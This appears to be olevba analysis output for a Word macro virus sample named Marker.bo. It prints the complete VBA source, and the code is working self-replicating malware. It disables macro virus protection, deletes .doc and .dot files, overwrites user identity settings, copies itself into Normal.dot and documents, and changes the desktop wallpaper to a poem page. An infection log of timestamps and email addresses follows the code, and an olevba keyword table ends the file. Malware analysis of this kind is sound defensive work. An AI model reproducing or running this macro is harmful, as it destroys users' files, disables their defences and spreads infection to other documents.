olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.bo-e215f9d73d9dfc24eb486b6bbca8d694f741570b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.bo-e215f9d73d9dfc24eb486b6bbca8d694f741570b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:05:474:05:47 AM AM-Thursday, 26 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:41:387:41:38 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:2212:43:22 PM PM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:02:559:02:55 -Sabtu, 28 Agust 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:16:1314:16:13 -Jumat, 3 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:17:374:17:37 AM AM-Saturday, 4 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:42:399:42:39 PM PM-Monday, 6 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:00:4210:00:42 PM PM-Wednesday, 8 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:19:334:19:33 PM PM-Thursday, 9 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:32:279:32:27 AM AM-Thursday, 16 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:23:111:23:11 PM PM-Wednesday, 6 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:56:212:56:02 PM PM-Friday, 8 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:37:611:37:06 AM AM-Saturday, 9 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:43:710:43:07 PM PM-Thursday, 14 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:30:25:30:02 PM PM-Wednesday, 10 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:17:510:17:05 AM AM-Tuesday, 16 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:17:146:17:14 PM PM-Monday, 15 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:32:467:32:46 PM PM-Thursday, 18 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:06:587:06:58 PM PM-Wednesday, 24 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:38:422:38:42 AM AM-Thursday, 25 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:59:48:59:04 PM PM-Thursday, 25 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:18:221:18:22 -Jumat, 26 Nop 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:51:287:51:28 PM PM-Monday, 29 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:58:510:58:05 -jeudi, 2 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:11:114:11:01 -lundi, 6 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:58:1918:58:19 -mardi, 7 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:43:2714:43:27 -lundi, 13 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:04:5511:04:55 -vendredi, 17 déc 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:10:4114:10:41 -jeudi, 13 janv 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:17:3010:17:30 -vendredi, 14 janv 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:08:5509:08:55 -mardi, 18 janv 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:14:5016:14:50 -mardi, 18 janv 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:30:1123:30:11 -mardi, 5 avr 1988
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:12:914:12:09 -mardi, 1 févr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:29:3416:29:34 -mercredi, 9 févr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:54:4015:54:40 -jeudi, 10 févr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:12:3015:12:30 -mercredi, 23 févr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:00:3012:00:30 -dimanche, 27 févr 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:20:1215:20:12 -samedi, 25 mars 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:03:2114:03:21 -jeudi, 22 juin 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:47:4613:47:46 -lundi, 26 juin 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:44:2113:44:21 -lundi, 8 janv 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:53:4515:53:45 -mercredi, 21 févr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:09:4117:09:41 -vendredi, 14 déc 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:29:4611:29:46 -lundi, 18 févr 2002
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:16:2215:16:22 -mardi, 10 déc 2002
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:16:2805:16:28 -jeudi, 26 juin 2003
' JonMMx 2000
' JonMMx2000@yahoo.com

 


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

